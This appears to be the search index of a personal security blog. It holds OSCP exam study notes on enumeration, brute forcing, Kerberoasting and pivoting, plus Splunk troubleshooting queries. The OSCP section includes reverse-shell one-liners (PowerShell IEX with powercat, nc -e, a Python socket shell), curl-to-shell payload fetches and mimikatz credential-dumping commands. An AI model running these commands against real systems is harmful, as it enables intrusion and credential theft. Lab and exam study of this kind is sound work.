{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"whoami","text":"<ul> <li>The blog is still updating</li> </ul> <p>I'm Ho Chak Lam, an Offensive Security Certified Professional (OSCP). I love to research on Offensive Security and SIEM. My areas of expertise involve Web Application and Network Security. At present, I'm working in Security Operation Center. I'm an avid learner in the field of Information Security for more than 3 years now.</p> <p>Let me share my research related to Information Security in this blog. Here are some channels that may be helpful for OSCP learners.</p>"},{"location":"#offsec-machine-walkthroughs","title":"OffSec Machine Walkthroughs","text":""},{"location":"#ultimate-oscp-guide","title":"Ultimate OSCP Guide","text":""},{"location":"OSCP_notes/Note%201/","title":"Note 1","text":""},{"location":"OSCP_notes/Note%201/#ultimate-guide","title":"Ultimate Guide","text":"<p>PayloadsAllTheThings Hacktricks GTFOBins WADComs </p>"},{"location":"OSCP_notes/Note%201/#easy-win","title":"Easy win","text":"<p>nmap scan  hydra ssh/ftp/rdp etc protocols burp/wireshark service report(enum4linux, Nikto, snmpwalk, dirbuster, onesixtyone, gobuster, vhost) msf modules log in anonymous (ftp, smb guess session) PUT or POST files to ports PHP &lt; 5.3 SQL running SQL injection (JSON?not json? blind sql?) Weak login? Bypass? LFI/RFI? Cookies? (bypass login? rce?) Create wordlists for brute force (cewl) Searchsploit?</p>"},{"location":"OSCP_notes/Note%201/#port-scanning","title":"Port Scanning","text":"<p>Options: -sT connect scan -sU UDP scan -sS TCP SYN scan -sn network sweep -sC default script -sV version detection of services -A Enable OS detection, version detection, script scanning, and traceroute -O OS Fingerprint -p- scans all TCP ports -Pn SOMETIMES causes FALSE POSITIVE, skip the initial stage that checks if the host is up -oG saves the output and uses grep to filter the results to only show lines that contain the word \"open\" in the \"Ports\" field </p>"},{"location":"OSCP_notes/Note%201/#banner-grabbing","title":"Banner Grabbing","text":"<p><pre><code>nc -vn &lt;IP&gt; Port\n</code></pre> - Port 21 - FTP - Port 22 - SSH - Port 23 - Telnet     - transfer data in plain text - Port 53 - DNS - Port 79 - Finger - Port 80/443 - HTTP(S) - Port 110 - POP3     - SMTP sends the email from the sender's device to the receiver's mailbox, and POP3 retrieves and organizes emails from the receiver's mail server to the receiver's computer - Port 139/445 - SMB - Port 161 - SNMP     - used for\u00a0communication between routers, switches, firewalls, load balancers, servers, CCTV cameras, and wireless devices. - Port 2049 - NFS     - allows remote hosts to mount file systems over a network and interact with those file systems as though they are mounted locally - Port 135, 593 - MSRPC - Port 25, 465(SSL), 587(SSL) - SMTP     - protocol utilized within the TCP/IP suite for the sending and receiving of e-mail - Port 389,636,3269 - LDAP     - LDAP is a protocol that many different directory services and access management solutions can understand. - Port 5432, 5433 - Postgresql - Port 1433 - MSSQL  - Port 3306 - MYSQL - Port 6379 - Redis     - a fast, open-source, in-memory key-value data structure store.     - session cache     - (FPC) Full Page Cache - Port 3389 - RDP     - graphical interface connection between computers over a network.</p>"},{"location":"OSCP_notes/Note%201/#initial-scan","title":"Initial Scan","text":"<p>nmap -sC -sV -oA nmap/initial (ip address)  (default script)(version detection of services)(output to nmap initial) </p>"},{"location":"OSCP_notes/Note%201/#detail-scan","title":"Detail Scan","text":"<p>nmap --script all -sC -sV -O -o fulltcpnmap -A -T4 -p- 10.129.77.60 (detail)  nmap -sC -sV -O -p- -oA nmap/full 10.10.10.3(detail)  enum4linux  nmap -A -sV -sU -sC -p- -o fulludpnmap 10.10.10.xxx  udp scan </p>"},{"location":"OSCP_notes/Note%201/#smb-quick-check","title":"SMB Quick Check","text":"<pre><code>nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.129.77.60\n</code></pre>"},{"location":"OSCP_notes/Note%201/#host-discovery","title":"Host Discovery","text":"<p>nmap -sn 10.10.1.1-254 -vv -oA hosts  netdiscover -r 10.10.10.0/24 <pre><code>#!/bin/bash  \n\nfor i in {1..256}; do ping -c 1 10.200.57.$i | grep \"bytes from\" | cut -d':' -f 1 | cut -d' ' -f4 &amp; done &amp;&amp; wait\n</code></pre></p>"},{"location":"OSCP_notes/Note%201/#multi-threaded-python-port-scanner","title":"Multi-threaded Python Port Scanner","text":"<p>https://github.com/dievus/threader3000</p>"},{"location":"OSCP_notes/Note%201/#dns-servervhost-discovery","title":"DNS server/vhost discovery","text":"<pre><code>nmap -p 53 10.10.10.1-254 -vv -oA dc \n</code></pre>"},{"location":"OSCP_notes/Note%201/#gobuster-ffuf-and-dnsrecon","title":"Gobuster, FFUF and dnsrecon","text":"<p><pre><code>gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \ngobuster vhost -u http://stocker.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain \n//gobuster vhost \nwfuzz -u http://10.10.11.114 -H \"Host: FUZZ.bolt.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 30341 \n//you can do it using wfuzz \n</code></pre> FFUF can be used to discovery subdomains by the use of virtual hosts and changing the Host header  Try running the below ffuf:  <pre><code>ffuf -w ~/wordlists/subdomains.txt -H \"Host: FUZZ.ffuf.me\" -u http://ffuf.me\n</code></pre> You'll see from the results that every result comes back with a size of 1495 Bytes. Now try running the below ffuf scan but this time using the -fs switch to filter out any results that are 1495 bytes. <pre><code>ffuf -w ~/wordlists/subdomains.txt -H \"Host: FUZZ.ffuf.me\" -u http://ffuf.me -fs 1495\n</code></pre> dnsrecon: <pre><code>dnsrecon -r 192.168.13.200-192.168.13.254 -n 192.168.13.220   //reverse lookup. dns server is -n\ndnsrecon -d acme.local -D /usr/share/golismero/wordlist/dns/dnsrecon.txt -t brt  //bruteforce the acme.local domain for domains and subdomains\ndnsrecon -a -d thinc.local -n 192.168.13.220  ## trying zone transfer. -n is the DNS server\ndnsenum (for better view and auto everything)\n</code></pre>  Dig Deeper: <pre><code>dig axfr cronos.htb @10.10.10.13\n</code></pre> retrieve the entire DNS zone data for the \"cronos.htb\" domain from the DNS server located at the IP address \"10.10.10.13\". (AXFR) DNS protocol operation used to transfer the entire zone data from a primary DNS server to a secondary DNS server.</p>"},{"location":"OSCP_notes/Note%201/#active-directory-check","title":"Active Directory Check","text":"<pre><code>#dig\ndig @10.10.10.52 AXFR htb.local \ndnsenum 10.10.10.52\n</code></pre>"},{"location":"OSCP_notes/Note%201/#check-smbrpc","title":"Check smb/rpc","text":"<pre><code>#smb/rpc\nsmbclient -L 10.10.10.52 -N \nrpcclient 10.10.10.52 -N\nsmbmap -u \"\" -p \"\" -P 445 -H &lt;DC IP&gt; &amp;&amp; smbmap -u \"guest\" -p \"\" -P 445 -H &lt;DC IP&gt;\nsmbclient -N -L //192.168.143.225\nsmbclient //10.129.143.225/shares -c 'ls' -U \"\"%\"\"\nsmbclient '\\\\10.129.143.225\\shares' -U 'guest'%'' -c 'prompt OFF;recurse ON;lcd /home/jacky/hacking/10.129.143.225/smbloot/;mget *'\n\nMaybe mount files for better view\nmount -t cifs //10.10.10.192/profiles$ /mnt\n</code></pre>"},{"location":"OSCP_notes/Note%201/#check-nmap-scripts","title":"Check nmap scripts","text":"<pre><code>#nmap scripts\nnmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.129.77.60\n\n#Check eternal blue (less possible)\n\n#enumerate krb users\nnmap 192.168.x.x -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='oscp.exam',userdb=/usr/share/seclists/Usernames/Names/names.txt\n</code></pre>"},{"location":"OSCP_notes/Note%201/#check-ldapsearch","title":"Check ldapsearch","text":"<pre><code>#ldapsearch\nldapsearch -x -H ldap://10.10.10.52 -b \"dc=htb,dc=local\"\nldapsearch -x -H ldap://$IP -D '' -w '' -b \"DC=cascade,DC=local\" &gt; full_ldap_dump.txt\nldapsearch -h 10.10.10.182 -x -b \"DC=cascade,DC=local\" '(objectClass=person)' &gt; ldap-people\nldapsearch -x -H ldap://$IP -s base | grep -i sAMAccountName:\nldapsearch -x -H ldap://$IP -s base | grep -i namingcontexts\nldapsearch -x -H ldap://$IP -s base | grep -i description\nldapsearch -H ldap://$IP -b \"DC=BLACKFIELD,DC=local\" -D 'support@blackfield.local' -w '#00^BlackKnight' | grep lockout\n\nSearch sth new and back to dig\n</code></pre>"},{"location":"OSCP_notes/Note%201/#check-ldap-with-nmap-and-enum4linux","title":"Check ldap with nmap and enum4linux","text":"<pre><code>nmap -p 389 --script ldap-search 10.10.10.161\nenum4linux 10.10.10.161 &gt; enum4linux-results.txt\n</code></pre> <p>Retrieve domain users who do not have \"Do not require Kerberos preauthentication\" set and ask for their TGTs without knowing their passwords.  Obtain a password hash for user accounts that have an SPN (service principal name) as well: <pre><code>#GetNPUsers.py\nGetNPUsers.py htb.local/ -dc-ip 10.10.10.52\nimpacket-GetNPUsers 'cascade.local/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip $IP\n\n#GetUserSPNs.py\nimpacket-GetUserSPNs -request -dc-ip 127.0.0.1 'sizzle.htb.local/amanda:Ashare1972' -save -outputfile GetUserSPNs.out\n\nproxychains GetUserSPNs.py \u2013request \u2013dc-ip xx.x.x.xx\noscp.exam/xxxx \u2013outputfile /tmp/hashes.kerberoast\n\nimapacket-mssqlclient oscp.exam/xxx:xxxx@192.168.x.x \u2013windows-auth\n--&gt; xp_cmdshell\n\njohn \u2013format=krb5tgs \u2013wordlist=~/rockyou.txt /tmp/hashes.kerberoast\n</code></pre></p>"},{"location":"OSCP_notes/Note%201/#kerbrutecmercecheck-other-common-exploits","title":"Kerbrute/CME/RCE/Check other common exploits","text":"<pre><code>powershell -c iex( iwr http://10.10.14.9/shell.ps1 -UseBasicParsing )\nIEX (New-Object System.Net.Webclient).DownloadString(\"http://MYIP/powercat.ps1\");powercat -c MYIP -p 4444 -e powershell\n\n#kerbrute\nkerbrute -domain htb.local -users /usr/share/wordlists/names.txt -dc-ip 10.10.10.52\n\n#crackmapexec\ncrackmapexec smb 10.10.10.52 -d htb.local -u htb.local/james -p /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt\n\ngoldenpac, zerologon, printnightmare, printspoofer, noPAC, Password Hash Synchronization, PrivExchange attack, Password Hash Synchronization (Microsoft Azure AD Sync)**\n</code></pre>"},{"location":"OSCP_notes/Note%201/#chiselpivoting","title":"Chisel/Pivoting","text":"<pre><code>cat /etc/proxychains4.conf\n\nlinux\n./chisellinuxamd server -p 8080 --reverse &amp;\n./chisellinuxamd client 10.10.16.25:8080 R:socks &amp;\nps auxww | grep chisel\n\nwindows\n$scriptBlock = { Start-Process C:\\Windows\\Tasks\\chisel.exe -ArgumentList @('client','10.0.0.2:8080','R:socks') } \nStart-Job -ScriptBlock $scriptBlock\n\n$process = Get-Process -Name chisel \nStop-Process -Id $process.Id\n\n#rev shell\n$scriptBlock = { Start-Process C:\\Windows\\Tasks\\nc.exe -ArgumentList @('10.0.0.2','4444','-e','cmd.exe') } \nStart-Job -ScriptBlock $scriptBlock\n</code></pre>"},{"location":"OSCP_notes/Note%201/#dump-password","title":"Dump password","text":"<pre><code>powershell iwr -uri 10.10.14.14/mimikatz.exe -outfile m.exe\n.\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n.\\m.exe \"privilege::debug\" \"token::elevate\" \"lsadump::lsa /patch\" exit\npypykatz lsa minidump lsass.DMP\n\n#one line all\n.\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::lsa /inject\" \"lsadump::sam\" \"lsadump::cache\" \"sekurlsa::ekeys\" \"exit\"\n</code></pre>"},{"location":"OSCP_notes/Note%201/#evil-winrm","title":"Evil winrm","text":"<pre><code>evil-winrm -i 192.x.x.101 -u administrator -H xxxxxxxx\nupload local_filename destination_filename\ndownload remote_filename destination_filename\n</code></pre>"},{"location":"OSCP_notes/Note%201/#nse-scripts-scan","title":"NSE Scripts Scan","text":"<p><pre><code>cat script.db | grep '\"vuln\"\\\\|\"exploit\"'\nnmap -sV --script=vulscan/vulscan.nse\n</code></pre> Port specific NSE script list: <pre><code>ls /usr/share/nmap/scripts/ssh\\*\nls /usr/share/nmap/scripts/smb\\*\n\nmasscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 &gt; ports\nports=\\$(cat ports | awk -F \" \" '{print \\$4}' | awk -F \"/\" '{print \\$1}' | sort -n | tr '\\n' ',' | sed 's/,\\$//')\nnmap -Pn -sV -sC -p$ports 10.10.10.x\n</code></pre> Running specific NSE scripts: <pre><code>nmap -Pn -sC -sV --script **\"http-*\"** -p$ports 10.10.10.x -T4 -A\n</code></pre> Searchsploit <pre><code>searchsploit \\&lt;name\\&gt;\nsearchsploit \\&lt;name\\&gt; -w -t  | grep http | cut -f 2 -d \"|\"\nsearchsploit -x exploits/php/webapps/47691.sh\nfor e in \\$(searchsploit afd windows -w -t | grep http | cut -f 2 -d \"|\");\ndo exp_name=\\$(echo \\$e | cut -d \"/\" -f 5) &amp;&amp; url=$(echo $e | sed 's/exploits/raw/') &amp;&amp;\nwget -q --no-check-certificate $url -O $exp_name; done\n</code></pre></p> <p>Database/Website search clues: <pre><code>find / -name database_settings.inc.php 2&gt;/dev/null\nfind config/config.inc.php\ncat /etc/apache2/sites-enabled/internal.conf \n</code></pre></p>"},{"location":"OSCP_notes/Note%201/#linpeaspspy64","title":"Linpeas/pspy64","text":"<p>linpeas: scan linux and exploit pspy64: check hidden cron jobs  <pre><code>python -m http.server 5050/80\ncurl \\&lt;kali linux ip address\\&gt;:5050/80/linpeas.sh | sh\nsudo nc -q 5 -lvnp 80 &lt; linpeas.sh #Host\ncat &lt; /dev/tcp/10.10.10.10/80 | sh #Victim\nwget http://attackerip/file\ncurl http://attackerip/file &gt; file\n</code></pre></p>"},{"location":"OSCP_notes/Note%201/#burp-suite","title":"Burp Suite","text":"<p>Proxy, Intercept is On Send to intruder for automation Send to Repeater Make sure post/get? -x/--proxy to localhost:8000 for intercept? (default port burp is 8080)  TCPDUMP icmp listener tcpdump -ni tun0 icmp tcpdump -xvi tun0 -c 10</p>"},{"location":"OSCP_notes/Note%201/#usb","title":"USB","text":"<p>grab a copy of the USB disk: <pre><code>sshpass -p raspberry ssh pi@10.10.10.48 \"sudo dd if=/dev/sdb | gzip -1 -\" | dd of=usb.gz\n</code></pre> read all of /dev/sdb and print it to STDOUT compress the file read from STDIN (-) and print the result to STDOUT,write that output to usb.gz extundelete usb --restore-all</p>"},{"location":"OSCP_notes/Note%201/#port-knocking","title":"Port Knocking","text":"<p>TCP knock -v 192.168.0.116 4 27391 159  UDP knock -v 192.168.0.116 4 27391 159 -u  TCP &amp; UDP knock -v 192.168.1.111 159:udp 27391:tcp 4:udp</p>"},{"location":"OSCP_notes/Note%201/#brute-force","title":"Brute Force","text":""},{"location":"OSCP_notes/Note%201/#johntheripper-and-cewl","title":"Johntheripper and cewl","text":"<pre><code>/usr/share/john/ssh2john.py key &gt; hash\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\ngpg2john .keys &gt; gpg.john (PGP keys)\n\ncewl -d 2 -m 5 -w docswords.txt http://10.10.10.10\n-d depth\n-m minimum word length\n-w output file\n--lowercase lowercase all parsed words (optional)\n</code></pre> <p>// For removing duplications in wordlist <pre><code>cat wordlist.txt| sort | uniq &gt; new_word.txt\n</code></pre></p>"},{"location":"OSCP_notes/Note%201/#hydra-brute-force","title":"Hydra brute force","text":"<p>Find mode if you forget: hashcat --help | grep -i \"Kerberos\" Check type: http-post-form? ssh? etc hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt // MD5 raw hashcat -m 1800 'hash$' /home/kali/Desktop/rockyou.txt // sha512crypt hashcat -m 1600 'hash$' /home/kali/Desktop/rockyou.txt // MD5(APR) hashcat -m 1500 'hash$' /home/kali/Desktop/rockyou.txt // DES(Unix), Traditional DES, DEScrypt hashcat -m 500 'hash$' /home/kali/Desktop/rockyou.txt // MD5crypt, MD5 (Unix) hashcat -m 400 'hash$' /home/kali/Desktop/rockyou.txt // Wordpress hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --potfile-disable to ignore potfile, if hashcat shows HEX[] strings as result, you may need to use --outfile-autohex-disable  Some login forms use simple base64 Try this: <pre><code>hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&amp;password=^PASS64^:C=/:F=403'\n</code></pre> -l user -P wordlist  -t 4 -V verbose -s  <pre><code>hydra -l user -P /usr/share/wordlists/rockyou.txt 10.129.18.249 http-post-form \"/tiny/tinyfilemanager.php:fm_usr=^USER^&amp;fm_pwd=^PASS^:Invalid Username or Password\"\n</code></pre> Output grepping: <pre><code>grep \"password: \" validpasswords.txt | awk '{print $7}' &gt;&gt; passwords.txt\n</code></pre> ffuf login brute force: <pre><code>ffuf -request requests.txt -request-proto http -mode clusterbomb -w passwords.txt:FUZZ -mc 200\n</code></pre> Brute Force too long? Try this!  <pre><code>cewl http://dc-2 -m 5 -w cewl.txt 2&gt;/dev/null\nusername-anarchy --input-file users.txt --select-format first,flast,first.last,firstl &gt; unames.txt\n</code></pre></p>"},{"location":"OSCP_notes/Note%201/#online-tools","title":"Online tools","text":"<p>https://crackstation.net/  LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults https://www.dcode.fr/tools-list  MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher https://www.md5online.org/md5-decrypt.html (MD5) https://products.aspose.app/email/viewer/msg (MSG reader) https://www.encryptomatic.com/viewer/ (view attachments .eml, .msg, winmail.dat) https://github.com/williballenthin/python-evtx (view windows logs .evtx) https://github.com/icsharpcode/ILSpy (open-source .NET assembly browser and decompiler) https://gchq.github.io/CyberChef/ (Swiss Knife) https://tio.run/# (debug) Full interactive shell with zsh https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html</p>"},{"location":"OSCP_notes/Note%201/#upgrade-shell","title":"Upgrade shell","text":"<p><pre><code>ctrl + z\nstty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\\n/'\nstty raw -echo; fg\nstty rows ROWS cols COLS\nexport TERM=xterm-256color\n/usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre>  Can use script to upgrade shell</p> <p><pre><code>SHELL=/bin/bash script -q /dev/null\n</code></pre>  Python upgrade shell</p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/sh\")'\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n/usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\npython -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"Kali-IP\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'\n</code></pre>"},{"location":"OSCP_notes/Note%201/#flags","title":"Flags","text":"<p>Windows: <pre><code>hostname &amp;&amp; whoami.exe\ncd C:\\Users\\Administrator\ntype \"C:\\Users\\Administrator\\Desktop\\proof.txt\"\nipconfig\n\n#search flags\ndir /s proof.txt\n</code></pre></p> <p><pre><code>Check for alternative data streams:\ndir /a /r\npowershell -c Get-Content -stream flag.txt root.txt\n</code></pre>  Linux:</p> <pre><code>cd /root\nhostname &amp;&amp; whoami &amp;&amp; cat /root/proof.txt &amp;&amp; ip a\n</code></pre>"},{"location":"OSCP_notes/Note%202/","title":"Note 2","text":""},{"location":"Projects/LaTeX%20Math%20Support/","title":"LaTeX Math Support","text":"<p>LaTeX math is supported using MathJax.</p> <p>Inline math looks like \\(f(x) = x^2\\). The input for this is <code>$f(x) = x^2$</code>. Use <code>$...$</code>.</p> <p>For a block of math, use <code>$$...$$</code> on separate lines</p> <pre><code>$$\nF(x) = \\int^a_b \\frac{1}{2}x^4\n$$\n</code></pre> <p>gives </p> \\[ F(x) = \\int^a_b \\frac{1}{2}x^4 \\]"},{"location":"Projects/Mermaid%20Diagrams/","title":"Mermaid diagrams","text":"<p>Here's the example from MkDocs Material documentation: </p> <pre><code>graph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|Yes| C[Hmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Yay!];</code></pre>"},{"location":"Projects/Text%20Formatting/","title":"Text Formatting","text":"<p>You can have lists like this</p> <ul> <li>first</li> <li>second</li> <li>third</li> </ul> <p>Or checklist lists to</p> <ul> <li> Get</li> <li> things</li> <li> done</li> </ul> <p>Also, get highlights and strikethroughs as above (similar to Obsidian).</p> <p>More formatting options for your webpage here. (but not compatible with Obsidian)</p>"},{"location":"Splunk_notes/Note%201/","title":"Note 1","text":""},{"location":"Splunk_notes/Note%201/#planning-for-infrastructure-and-resource-scalability","title":"Planning for Infrastructure and Resource Scalability","text":"<p>What is your current logging infrastructure? What logs will be ingested into Splunk? What are the retention periods for each of those logs you mentioned? Reference What levels of access will be required to the data? Do you have an estimate of the daily amounts for your data sources? Estimate the disk space requirements. Assume the following compression factors for all of the data sources:  \u2022 15% compression for rawdata  \u2022 35% compression for index files</p>"},{"location":"Splunk_notes/Note%201/#license","title":"License","text":"<p>Take the upper limit. Example: 315 gb = 315 x 1.10 = 346.5 = 350 gb license. If the excess usage exceeds ten percent (10%) of the Licensed\u00a0Capacity, then Customer will also pay Splunk's reasonable costs of conducting the audit.</p>"},{"location":"Splunk_notes/Note%201/#troubleshooting-splunk","title":"Troubleshooting Splunk","text":""},{"location":"Splunk_notes/Note%201/#general","title":"General","text":"<p><pre><code>a. How are the servers connected? \nindex=_internal sourcetype=splunkd connection* | stats count by sourceIp, host, destPort \nindex=_internal sourcetype=splunkd connection* | stats max(_time) as lastEventTime by host\n| convert ctime(lastEventeTime)\n</code></pre> <pre><code>b. Which servers are forwarding? \nindex=_internal sourcetype=splunkd tcpout_connections | stats count by host, destIp, destPort | rename host as forwarder, destIp as indexer, destPort as listening_port \nindex=_internal sourcetype=splunkd metrics group=tcpin_connections connectionType=cooked* | stats sum(kb) by hostname, fwdType, lastIndexer \n</code></pre> <pre><code>c. Are the forwarders also deployment clients? index=_internal sourcetype=splunkd component=DC* Handshake | stats count by host \n</code></pre> <pre><code>d. Where is the deployment server? index=_internal sourcetype=splunkd component=DeployedApplication url=* | table host url \n</code></pre> <pre><code>e. What apps have been deployed to the forwarders from the deployment server and when? \nindex=_internal sourcetype=splunkd component=DeployedApplication installing | stats count latest(_time) AS latest_time by host app | convert ctime(latest_time)\n</code></pre> <pre><code>f. permission issue/specific user\n$SPLUNK_HOME/bin/splunk enable boot-start -user bob\nchown -RP splunk:splunk /opt/splunk\n</code></pre> <pre><code>g. Is client phoning home?\nindex=_internal sourcetype=splunkd connection* | stats max(_time) as lastEventTime by host\n| convert ctime(lastEventTime)\n</code></pre> <pre><code>h. Show alert list in query?\n| rest/servicesNS/-/-/saved/searches | search alert.track=1 | fields title description search disabled triggered_alert_count actions action.script.filename alert.severity cron_schedule\n</code></pre> <pre><code>#Check email\n| rest /services/saved/searches\n| search action.email.to=* action.email=1 disabled=0\n| rename eai:acl.app as Application, title as \"Alert Name\", triggered_alert_count as \"Times Triggered Conditions Met\", splunk_server as Host, action.email.to as \"Sent To\"\n| table Application, \"Alert Name\", description, \"Times Triggered Conditions Met\", Host, \"Sent To\", search, actions, action.script.filename, action.email.subject, action.email.subject.alert, alert.severity, cron_schedule\n</code></pre> <pre><code>grep alert config\nfind . -name savedsearches.conf -exec grep -iH \"Basic\" {} \\;\nfind . -name savedsearches.conf\n</code></pre> Reference <pre><code>i. Check License usage (real time usage ONLY)?\nindex=_internal source=*license_usage.log type=\"Usage\"    | eval indexname = if(len(idx)=0 OR isnull(idx),\"(UNKNOWN)\",idx) | eval sourcetypename = st | bin _time span=1d | stats values(poolsz) as poolsz sum(b) as b by _time, pool, indexname, sourcetypename | eval GB=(b/1024/1024/1024) | eval pool=(poolsz/1024/1024/1024) | fields _time, indexname, sourcetypename, GB, pool\n| stats sum(GB) by indexname, _time\n| eval license_usage_percentage = (GB_used / 250) * 100\n</code></pre> <pre><code>j. Check Datamodel\n|  datamodel Authentication search\n|  search Authentication.user=*\n|  stats count by Authentication.user\n</code></pre></p>"},{"location":"Splunk_notes/Note%201/#diag","title":"Diag","text":"<p>Generate Diag:  Navigate to Settings &gt; Instrumentation  Click New Diag  Index New Diag: Settings &gt; Add Data &gt; Monitor Select the Index Once option and click Next <pre><code>Determine the Splunk version and its system information\nindex=diag source=*systeminfo.txt (version OR Uname OR \"process listing\")\n</code></pre> <pre><code>to list the apps installed and determine their running status, search (All time)\nindex=diag source=*etc/apps/*app.conf | rex field=source \"etc/apps/(?\\w+)/\" | rex field=_raw \"label.\\=.(?.+)\" | stats values(label) as Name, values(state) as State, values(is_visible) as Visible by folderName\n</code></pre></p>"},{"location":"Splunk_notes/Note%201/#indexing-issues","title":"Indexing Issues","text":""},{"location":"blog/","title":"Blog","text":"<p>Test</p>"}]}